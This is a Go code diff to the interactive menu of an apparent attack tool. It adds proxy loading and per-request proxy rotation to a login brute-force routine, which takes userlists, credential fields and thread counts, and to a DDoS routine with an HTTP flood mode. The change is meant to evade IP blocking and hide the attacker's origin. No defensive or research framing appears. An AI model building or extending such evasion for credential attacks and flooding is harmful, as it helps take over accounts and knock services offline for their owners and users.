@@ -96,6 +96,44 @@ func (m *Menu) attackWithCurl() {
 	// Get common attack parameters
 	fmt.Println("\n===== Attack Configuration =====")
 
+	// Ask if using proxy
+	fmt.Print("Use proxy for attacks? (y/n, default: n): ")
+	useProxyStr, _ := reader.ReadString('\n')
+	useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
+	useProxy := useProxyStr == "y" || useProxyStr == "yes"
+
+	var proxyList []string
+	var rotateProxy bool
+	if useProxy {
+		// Load proxies from proxy/proxy.txt
+		proxies, err := m.loadValidProxies()
+		if err != nil || len(proxies) == 0 {
+			fmt.Printf("Warning: No valid proxies found in proxy/proxy.txt (%v)\n", err)
+			fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
+			fmt.Print("Continue without proxy? (y/n): ")
+			continueStr, _ := reader.ReadString('\n')
+			if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
+				return
+			}
+			useProxy = false
+		} else {
+			proxyList = proxies
+			fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))
+
+			// Ask if rotate proxies
+			fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
+			rotateStr, _ := reader.ReadString('\n')
+			rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
+			rotateProxy = rotateStr != "n" && rotateStr != "no"
+
+			if rotateProxy {
+				fmt.Println("✓ Proxy rotation enabled")
+			} else {
+				fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
+			}
+		}
+	}
+
 	// Ask if using userlist or single username
 	fmt.Print("Use userlist file? (y/n, default: n): ")
 	useUserlist, _ := reader.ReadString('\n')
@@ -194,6 +232,11 @@ func (m *Menu) attackWithCurl() {
 		attackConfig.MaxThreads = maxThreads
 		attackConfig.ShowAttempts = false
 
+		// Apply proxy settings
+		attackConfig.UseProxy = useProxy
+		attackConfig.ProxyList = proxyList
+		attackConfig.RotateProxy = rotateProxy
+
 		if len(successCodes) > 0 {
 			attackConfig.SuccessCodes = successCodes
 		}
@@ -211,6 +254,9 @@ func (m *Menu) attackWithCurl() {
 		fmt.Printf("  → Username field: %s\n", attackConfig.UsernameField)
 		fmt.Printf("  → Password field: %s\n", attackConfig.PasswordField)
 		fmt.Printf("  → Threads: %d, Timeout: %v\n", maxThreads, attackConfig.Timeout)
+		if useProxy {
+			fmt.Printf("  → Proxy: Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
+		}
 		if len(attackConfig.CustomHeaders) > 0 {
 			fmt.Printf("  → Custom headers: %d\n", len(attackConfig.CustomHeaders))
 		}
@@ -362,6 +408,44 @@ func (m *Menu) ddosAttack() {
 	// Get DDoS configuration
 	fmt.Println("\n===== DDoS Configuration =====")
 
+	// Ask if using proxy
+	fmt.Print("\nUse proxy for attacks? (y/n, default: n): ")
+	useProxyStr, _ := reader.ReadString('\n')
+	useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
+	useProxy := useProxyStr == "y" || useProxyStr == "yes"
+
+	var proxyList []string
+	var rotateProxy bool
+	if useProxy {
+		// Load proxies from proxy/proxy.txt
+		proxies, err := m.loadValidProxies()
+		if err != nil || len(proxies) == 0 {
+			fmt.Printf("Warning: No valid proxies found in proxy/proxy.txt (%v)\n", err)
+			fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
+			fmt.Print("Continue without proxy? (y/n): ")
+			continueStr, _ := reader.ReadString('\n')
+			if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
+				return
+			}
+			useProxy = false
+		} else {
+			proxyList = proxies
+			fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))
+
+			// Ask if rotate proxies
+			fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
+			rotateStr, _ := reader.ReadString('\n')
+			rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
+			rotateProxy = rotateStr != "n" && rotateStr != "no"
+
+			if rotateProxy {
+				fmt.Println("✓ Proxy rotation enabled")
+			} else {
+				fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
+			}
+		}
+	}
+
 	// Attack Mode
 	fmt.Println("\nSelect Attack Mode:")
 	fmt.Println("  [1] HTTP Flood     - Maximum concurrent HTTP requests (Default)")
@@ -442,6 +526,10 @@ func (m *Menu) ddosAttack() {
 		config.RateLimit = rateLimit
 		config.ReuseConnections = reuseConnections
 		config.Timeout = timeout
+		// Apply proxy settings
+		config.UseProxy = useProxy
+		config.ProxyList = proxyList
+		config.RotateProxy = rotateProxy
 	}
 
 	// Summary before starting
@@ -459,6 +547,11 @@ func (m *Menu) ddosAttack() {
 	}
 	fmt.Printf("Reuse Connections: %v\n", reuseConnections)
 	fmt.Printf("Request Timeout:   %s\n", timeout)
+	if useProxy {
+		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
+	} else {
+		fmt.Printf("Proxy:             Disabled\n")
+	}
 	fmt.Println(strings.Repeat("=", 70))
 
 	// Final confirmation
